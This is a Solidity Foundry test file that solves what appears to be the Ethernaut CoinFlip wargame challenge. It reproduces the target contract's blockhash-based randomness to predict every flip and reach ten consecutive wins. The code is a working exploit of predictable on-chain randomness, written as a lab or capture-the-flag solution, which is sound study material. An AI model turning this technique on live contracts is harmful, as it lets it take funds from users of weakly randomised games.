// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/CoinFlip.sol";
import {Test} from "forge-std/Test.sol";

contract CoinFlipTest is Test {
    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        coinFlip = new CoinFlip();
    }

    function test_ExploitCoinFlip() public {
        for (uint256 i = 0; i < 10; i++) {
            // 1. Replicate the target's pseudo-random calculation locally
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 computedCoinFlip = blockValue / FACTOR;
            bool guess = computedCoinFlip == 1 ? true : false;

            // 2. Call the flip function with our guaranteed winning guess
            bool success = coinFlip.flip(guess);
            require(success, "Flip failed");

            // 3. Adavance to the next block so blockhash changes for the next iteration
            vm.roll(block.number + 1);
        }

        // Verify we hit our goal of 10 consecutive wins
        require(coinFlip.consecutiveWins() == 10, "Did not reach 10 wins");
    }
}
